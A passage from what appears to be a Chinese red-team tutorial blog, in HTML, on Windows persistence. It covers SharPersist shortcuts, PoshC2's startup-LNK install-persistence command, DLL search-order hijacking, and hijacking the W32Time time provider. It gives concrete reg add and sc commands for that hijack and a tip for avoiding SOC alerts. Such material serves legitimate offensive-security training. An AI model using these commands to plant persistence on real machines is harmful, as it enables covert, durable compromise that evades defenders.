https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103457702-2132720686.png?size=large 2x" data-title=" SharPersist –快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>当用户进行身份验证时，将执行payload，并打开Meterpreter会话.</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103529714-2117172312.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103529714-2117172312.png" alt=" SharPersist – Meterpreter" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103529714-2117172312.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103529714-2117172312.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103529714-2117172312.png?size=large 2x" data-title=" SharPersist – Meterpreter" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="poshc2-2" class="heading-element"><span>PoshC2</span>
  <a href="#poshc2-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>PoshC2可以创建一个LNK文件并将其直接放置在Windows启动文件夹中以保持持久性。可以通过执行以下命令来调用此技术：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">install</span><span style="color:#ff636f">-</span><span style="color:#58a1dd">persistence</span> <span style="color:#a6be9d">3</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103555784-447693490.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103555784-447693490.png" alt=" PoshC2 –启动LNK文件" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103555784-447693490.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103555784-447693490.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103555784-447693490.png?size=large 2x" data-title=" PoshC2 –启动LNK文件" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>在Windows登录期间，快捷方式将尝试在注册表项上执行值，该注册表项包含base64格式的stager。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111103622513-1700304293.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103622513-1700304293.png" alt=" PoshC2 –快捷方式" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103622513-1700304293.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103622513-1700304293.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111103622513-1700304293.png?size=large 2x" data-title=" PoshC2 –快捷方式" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h1 id="dll劫持" class="heading-element"><span>DLL劫持</span>
  <a href="#dll%e5%8a%ab%e6%8c%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h3 id="介绍" class="heading-element"><span>介绍</span>
  <a href="#%e4%bb%8b%e7%bb%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>DLL劫持漏洞之所以被称为漏洞，还要从负责加载DLL的系统API LoadLibrary 来看。熟悉Windows代码的同学都知道，调⽤ LoadLibrary 时可以使⽤DLL的相对路径。这时，系统会按照特定的顺序搜索⼀ 些⽬录，以确定DLL的完整路径。根据MSDN⽂档的约定，在使⽤相对路径调⽤ LoadLibrary （同样适 ⽤于其他同类DLL LoadLibraryEx，ShellExecuteEx等）时，系统会依次从以下6个位置去查找所需要的 DLL⽂件（会根据SafeDllSearchMode配置⽽稍有不同）。</p>
<ol>
<li>程序所在⽬录。</li>
<li>加载 DLL 时所在的当前⽬录。</li>
<li>系统⽬录即 SYSTEM32 ⽬录。</li>
<li>16位系统⽬录即 SYSTEM ⽬录。</li>
<li>Windows⽬录。</li>
<li>PATH环境变量中列出的⽬录</li>
</ol>
<p>dll劫持就发⽣在系统按照顺序搜索这些特定⽬录时。只要⿊客能够将恶意的DLL放在优先于正常DLL所在的⽬录，就能够欺骗系统优先加载恶意DLL，来实现“劫持”。</p>
<p><strong>在win7及win7以上系统增加了KnownDLLs保护，需要在如下注册表下添加dll才能顺利劫持</strong></p>
<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\ExcludeFromKnownDlls</code></pre><p>关于dll劫持的文章有很多,也需要去挖掘,这里推荐一篇文章入门</p>
<blockquote>
<p><a href="https://www.cnblogs.com/punished/p/14715771.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/punished/p/14715771.html</a></p>
</blockquote>
<h3 id="时间服务器" class="heading-element"><span>时间服务器</span>
  <a href="#%e6%97%b6%e9%97%b4%e6%9c%8d%e5%8a%a1%e5%99%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Windows操作系统正在利用时间提供者体系结构，以便从网络中的其他网络设备或客户端获取准确的时间戳。时间提供者以DLL文件的形式实现，该文件位于System32文件夹中。Windows启动期间将启动服务<strong>W32Time</strong>并加载w32time.dll。DLL加载是一种已知的技术，通常使红队攻击者有机会执行任意代码。</p>
<p>由于关联的服务会在Windows启动期间自动启动，因此可以将其用作持久性机制。但是，此方法需要管理员级别的特权，因为指向时间提供者DLL文件的注册表项存储在HKEY_LOCAL_MACHINE中。根据系统是用作NTP服务器还是NTP客户端，使用以下两个注册表位置。</p>
<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer</code></pre><p>该<strong>W32Time将</strong>运行在Windows环境作为本地服务，它是通过svchost的执行。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134557826-1438345258.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134557826-1438345258.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134557826-1438345258.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134557826-1438345258.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134557826-1438345258.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>恶意DLL已放入磁盘中，将执行payload。在命令提示符下，可以通过执行以下命令以指向任意DLL的位置来修改时间提供者注册表项。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">reg</span> <span style="color:#58a1dd">add</span> <span style="color:#a6be9d">&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient&#34;</span> /<span style="color:#58a1dd">v</span> <span style="color:#58a1dd">DllName</span> /<span style="color:#58a1dd">t</span> <span style="color:#58a1dd">REG_SZ</span> /<span style="color:#58a1dd">d</span> <span style="color:#a6be9d">&#34;C:\temp\w32time.dll&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134619162-1282116869.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134619162-1282116869.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134619162-1282116869.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134619162-1282116869.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134619162-1282116869.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>从注册表编辑器中查看注册表将确认<strong>DllName</strong>的值已更新。</p>
<p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134635629-24445574.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134635629-24445574.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134635629-24445574.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134635629-24445574.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134635629-24445574.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>该服务将在Windows启动期间启动，或者通过执行以下命令手动启动。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#58a1dd">sc</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">stop</span> <span style="color:#58a1dd">w32time</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">sc</span>.<span style="color:#58a1dd">exe</span> <span style="color:#58a1dd">start </span><span style="color:#58a1dd">w32time</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134702533-1784118205.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134702533-1784118205.png" alt="img" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134702533-1784118205.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134702533-1784118205.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134702533-1784118205.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="补充说明" class="heading-element"><span>补充说明</span>
  <a href="#%e8%a1%a5%e5%85%85%e8%af%b4%e6%98%8e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>修改Windows时间提供程序可能会向SOC团队发出警报。来自Carbon Black的<a href="https://twitter.com/5twenty9"target="_blank" rel="external nofollow noopener noreferrer">Scott Lundgren</a>在C中开发了一种称为<a href="https://github.com/scottlundgren/w32time"target="_blank" rel="external nofollow noopener noreferrer">gametime</a>的时间提供程序。可以使用此DLL来向操作系统注册新的时间提供者，并在其他注册表项中执行修改。这样可以避免滥用现有的Windows时间提供程序，而该时间提供程序可以由SOC监视。Rundll32可用于注册DLL。</p>
<p>Scott Lundgren使用了要在系统上创建的注册表项“ GameTime”。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#define GAMETIME_SVC_KEY_NAME   L&#34;System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\GameTime&#34;</span></span></span></code></pre></div><p><a href="https://blog.gm7.org/%e4%b8%aa%e4%ba%ba%e7%9f%a5%e8%af%86%e5%ba%93/01.%e6%b8%97%e9%80%8f%e6%b5%8b%e8%af%95/04.%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81/%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81.assets/894761-20191111134730038-745714950.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134730038-745714950.png" alt="时间提供者– GameTime注册表项" srcset="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134730038-745714950.png?size=small, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134730038-745714950.png?size=medium 1.5x, https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81.assets/894761-20191111134730038-745714950.png?size=large 2x" data-title="时间提供者– GameTime注册表项" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
